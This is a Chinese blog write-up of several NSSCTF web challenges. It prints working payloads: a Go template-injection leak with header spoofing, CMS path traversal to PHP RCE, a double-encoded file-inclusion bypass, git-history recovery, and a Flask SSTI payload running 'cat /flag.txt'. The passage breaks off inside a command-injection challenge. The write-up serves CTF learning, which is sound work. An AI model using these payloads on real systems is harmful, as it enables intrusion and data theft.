@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-write up -ctf -web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言继续刷NSSCTF上的题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF练习3">
+<meta property="og:url" content="http://example.com/2022/04/08/NSSCTF%E7%BB%83%E4%B9%A03/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言继续刷NSSCTF上的题。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/04/08/3guNdPKaI4CAsDc.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/08/NHMhLZnCFzD5eBW.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/08/QfcWVEqhl6iBRog.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/08/oBrnluqH7f3VNdI.png">
+<meta property="article:published_time" content="2022-04-08T06:08:30.000Z">
+<meta property="article:modified_time" content="2022-04-09T10:09:45.835Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-write up -ctf -web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/08/3guNdPKaI4CAsDc.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/04/08/NSSCTF练习3/"/>
+
+
+
+
+
+  <title>NSSCTF练习3 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/08/NSSCTF%E7%BB%83%E4%B9%A03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">NSSCTF练习3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-08T14:08:30+08:00">
+                2022-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续刷NSSCTF上的题。</p>
+<span id="more"></span>
+
+<h1 id="SCTF-2021-loginme"><a href="#SCTF-2021-loginme" class="headerlink" title="[SCTF 2021]loginme"></a>[SCTF 2021]loginme</h1><p>下载附件，发现是go语言编写的网页，虽然没学过go，但是关键代码部分还是能审的。</p>
+<p>同时进入网页，提示我们非本地不能登录，但是测试发现不能用xff绕过，因此我们找到对应代码middleware.go：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package middleware</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func LocalRequired() gin.HandlerFunc &#123;</span><br><span class="line">	return func(c *gin.Context) &#123;</span><br><span class="line">		if c.GetHeader(&quot;x-forwarded-for&quot;) != &quot;&quot; || c.GetHeader(&quot;x-client-ip&quot;) != &quot;&quot; &#123;</span><br><span class="line">			c.AbortWithStatus(403)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		ip := c.ClientIP()</span><br><span class="line">		if ip == &quot;127.0.0.1&quot; &#123;</span><br><span class="line">			c.Next()</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			c.AbortWithStatus(401)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显然xff和cip都被禁用了，使用就会跳转至403页面，因此这里要使用x-real-ip绕过。</p>
+<p>接着我们发现之后的页面回显了一些信息，根据url中id值的不同回显内容也不同，那么我们审查下这一部分的代码，structs.go：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package structs</span><br><span class="line"></span><br><span class="line">type UserInfo struct &#123;</span><br><span class="line">	Id       int</span><br><span class="line">	Username string</span><br><span class="line">	Age      string</span><br><span class="line">	Password string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var Users = []UserInfo&#123;</span><br><span class="line">	&#123;</span><br><span class="line">		Id:       1,</span><br><span class="line">		Username: &quot;Grandpa Lu&quot;,</span><br><span class="line">		Age:      &quot;22&quot;,</span><br><span class="line">		Password: &quot;hack you!&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		Id:       2,</span><br><span class="line">		Username: &quot;Longlone&quot;,</span><br><span class="line">		Age:      &quot;??&quot;,</span><br><span class="line">		Password: &quot;i don&#x27;t know&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		Id:       3,</span><br><span class="line">		Username: &quot;Teacher Ma&quot;,</span><br><span class="line">		Age:      &quot;20&quot;,</span><br><span class="line">		Password: &quot;guess&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var Admin = UserInfo&#123;</span><br><span class="line">	Id:       0,</span><br><span class="line">	Username: &quot;Admin&quot;,</span><br><span class="line">	Age:      &quot;&quot;,</span><br><span class="line">	Password: &quot;flag&#123;&#125;&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现admin的密码就是flag，而age是空的，但是在返回时我们发现admin的age有返回，因此我们跟进age的返回，查看代码route.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">age := TargetUser.Age</span><br><span class="line">if age == &quot;&quot; &#123;</span><br><span class="line">	age, flag = c.GetQuery(&quot;age&quot;)</span><br><span class="line">	if !flag &#123;</span><br><span class="line">		age = &quot;forever 18 (Tell me the age)&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)</span><br></pre></td></tr></table></figure>
+
+<p>由于年龄是空所以返回了对应的值，而打印年龄的代码是格式化字符串并赋值给新串。继续往下看发现还有模板渲染语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmpl, err := template.New(&quot;admin_index&quot;).Parse(html)</span><br></pre></td></tr></table></figure>
+
+<p>go语言模板渲染支持传入一个结构体的实例来渲染它的字段，就有可能造成信息泄露。而在go语言中使用的是<code>&#123;&#123;.name&#125;&#125;</code>代表要应用的对象，所以可以让<code>age=&#123;&#123;.Password&#125;&#125;</code>。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&amp;age=&#123;&#123;.Password&#125;&#125;</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h1><p>也开始做一些cms的题目了。首先目录扫描扫出admin.php，进入登录，提示5位弱口令，测试出来是12345。进入后台后，寻找能够利用的利用点，比如文件上传、页面更改等等。</p>
+<p>我们在设计-主题的菜单中发现可以更改网页设置，并且在类型选择中可以选择php源代码，因此我们在首页编辑的幻灯片中更改内容为php源代码。但是保存时发现验证管理员权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请在服务器创建 /var/www/html/system/tmp/vhpg.txt 文件，如果存在该文件，使用编辑软件打开，重新保存一遍。</span><br></pre></td></tr></table></figure>
+
+<p>那么我们需要寻找文件上传点，我们在设计-组件-素材库中发现上传点，上传一个txt后根据目录来重命名文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../system/tmp/vhpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/08/3guNdPKaI4CAsDc.png"></p>
+<p>路径确认更改后，回到之前的页面更改布局为php源代码，直接rce，回到前台，原来幻灯片的位置已经变成了flag。</p>
+<h1 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="[HCTF 2018]Warmup"></a>[HCTF 2018]Warmup</h1><p>进入网页看到一个滑稽，审查元素发现提示source.php。</p>
+<p>审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一眼看过去以为是反序列化，但是有没看到反序列化的函数。因此首先看class外的部分，一个文件包含，最重要的是有做调用。那么我们顺势康康class内部。</p>
+<p>我们发现白名单只允许读取source.php和hint.php，传入hint.php读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>好，我们知道了flag藏在哪里了，但是我们没法直接读取，因此继续往下看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    0,</span><br><span class="line">    mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以好好研究下这段代码，mb_strpos()的作用是返回第二个参数在第一个参数中首次出现的位置，因此正常情况下这里返回的应该是最后一个位置，即-1。</p>
+<p>接下来是mb_strpos()，这个函数有三个参数，第一个参数是操作字符串，第二个参数是操作起始位置，第三个参数是操作字符长度。因此这里本应该读取$page的全部内容，即file的内容。</p>
+<p>但是如果我们在file中加入<code>?</code>，那么就能造成截断。这个时候page将会验证<code>?</code>前方的str是否包含在array中，因此就能实现checkFile函数的绕过。</p>
+<p>我们发现原函数进行了一次url解码，因此我们进行两次url编码，这样得到的%253f会在第二次decode后于最后一个in_array验证被截断并返回true。最后利用<code>/</code>读取flag，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php%253f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<h1 id="NCTF-2018-全球最大交友网站"><a href="#NCTF-2018-全球最大交友网站" class="headerlink" title="[NCTF 2018]全球最大交友网站"></a>[NCTF 2018]全球最大交友网站</h1><p>这题是个比较特殊的git源码泄露，跟之前的有点不一样，感觉挺有意思的就记录一下。</p>
+<p>首先是NSS环境的问题导致题目有点问题，访问/.git时不会跳403而是直接到目录了，不过问题不大，因为这样我们也没法获取flag。</p>
+<p>我们常用的GitHack工具会直接把.git恢复到文件已经完成了，然后还把.git文件夹删了，也就自动恢复成了最新版本。因此我们要使用lijiejie的GitHack工具。</p>
+<p>这题的思路和p牛15年的一篇文章其中的一些内容是一样的，先贴一下：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html">XDCTF2015代码审计全解</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://1.14.71.254:28583/.git/</span><br></pre></td></tr></table></figure>
+<p>下载后发现README.md：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Allsource files areingit tag1.0</span><br></pre></td></tr></table></figure>
+
+<p>说明flag在历史版本中，由于原理法实在难啃，我们就直接用工具啃，直接上scarbble：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scrabble http://1.14.71.254:28583</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/08/NHMhLZnCFzD5eBW.png"></p>
+<p>通过<code>git log</code>查看历史：<br><img src="https://s2.loli.net/2022/04/08/QfcWVEqhl6iBRog.png"></p>
+<p>把head轮流指向这些文件，找到真正的flag藏在hello中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show HEAD 01b878ee5f39810a02f06b4a560571413020ea42</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/08/oBrnluqH7f3VNdI.png"></p>
+<h1 id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h1><p>进入网页，啥都没有，只有一行提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome To Find Secret</span><br></pre></td></tr></table></figure>
+
+<p>这个意思比较抽象，其实是指向secret路由，进入后又有一行提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so others can&#x27;t see</span><br></pre></td></tr></table></figure>
+
+<p>这比上一个来说还是好一点的，意思就是传参一个secret，那么我们应该传参啥，无非就试试sql、ssti这几个比较常用的。</p>
+<p>经测试是ssti，我们输入<code>&#123;&#123;2+2&#125;&#125;</code>时出现了报错，告诉我们模板是flask，python2.7，使用RC4加密算法，密钥为HereIsTreasure。</p>
+<p>因此我们使用rc4加密的exp对payload进行加密：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))</span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;lipsum.__globals__.__builtins__.eval(\&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()\&quot;)&#125;&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
+<p>传参获取flag。</p>
+<h1 id="AFCTF-2021-search"><a href="#AFCTF-2021-search" class="headerlink" title="[AFCTF 2021]search"></a>[AFCTF 2021]search</h1><p>这题还是比较简单的，首先信息搜集发现<code>www.zip</code>，获取源码search.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$argv = $_GET[&quot;search&quot;];</span><br><span class="line">for ($i = 0; $i &lt; strlen($argv); $i++) &#123;</span><br><span class="line">  if (($argv[$i] == &#x27;&amp;&#x27;) ||</span><br><span class="line">    ($argv[$i] == &#x27;&gt;&#x27;) ||</span><br><span class="line">    ($argv[$i] == &#x27;&lt;&#x27;) ||</span><br><span class="line">    ($argv[$i] == &#x27;(&#x27;) ||</span><br><span class="line">    ($argv[$i] == &#x27;;&#x27;) ||</span><br><span class="line">    ($argv[$i] == &#x27;|&#x27;)</span><br><span class="line">  ) &#123;</span><br><span class="line"></span><br><span class="line">    if ($i == 0) &#123;</span><br><span class="line">      goto error;</span><br><span class="line">    &#125;</span><br><span class="line">    if (($i == 1) &amp;&amp; ($argv[0] == &#x27;\\&#x27;)) &#123;</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    if (($argv[$i - 1] == &#x27;\\&#x27;) &amp;&amp; ($argv[$i - 2] != &#x27;\\&#x27;)) &#123;</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    error:</span><br><span class="line">    exit(&quot;Input contains prohibited characters!&lt;br&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;h3&gt;Search reslut:&lt;/h3&gt;&lt;br&gt;&quot;;</span><br><span class="line">system(&quot;find / -iname &quot; . $argv);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>非常直观，实行find命令，发现flag在根目录下，这里我们只需要利用<code>-exec</code>执行命令就可以了，payload:</p>
